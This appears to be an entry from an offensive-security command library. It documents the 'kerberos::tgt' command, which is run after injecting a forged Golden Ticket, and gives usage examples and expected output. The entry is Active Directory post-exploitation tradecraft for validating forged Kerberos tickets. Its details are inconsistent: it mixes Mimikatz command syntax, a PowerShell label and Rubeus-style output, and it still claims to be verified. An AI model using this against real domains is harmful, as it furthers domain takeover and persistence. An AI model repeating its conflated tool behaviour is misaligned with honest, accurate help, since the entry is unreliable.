---
id: 2b8f46da-ed75-431c-b59a-755d4f96dbc4
name: Request-TGT-with-Golden-Ticket
type: command
executor: powershell
data: 'kerberos::tgt'
output: null
created_at: '2023-04-06T03:56:28.444758+00:00'
updated_at: '2023-04-10T20:37:25.781492+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - ticket-request
verified: true
validated: true
---

# Request-TGT-with-Golden-Ticket

## Command

```powershell
kerberos::tgt
```

## Description

This command requests a Ticket Granting Ticket (TGT) from the KDC using the currently injected Kerberos ticket (e.g., a Golden Ticket). It verifies the ticket's validity and prepares the session for requesting service tickets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Uses the current session's primary ticket | N/A |

## Examples

### Basic Usage

```powershell
kerberos::tgt
```

Run after injecting a Golden Ticket to confirm functionality.

### With Display

```powershell
kerberos::tgt /display
```

This shows details of the requested TGT.

## Expected Output

Success: "[*] Action: Requesting TGT..." and details like "ServiceName: krbtgt/EXAMPLE.COM", "StartTime: 1/1/1601", "EndTime: 9/18/2033" (long validity for Golden Tickets). The TGT is cached for use in subsequent requests.

## Related

- [[procedures/Golden-Ticket-Creation-via-Kerberos-Purge]]
- [[tools/Rubeus]]
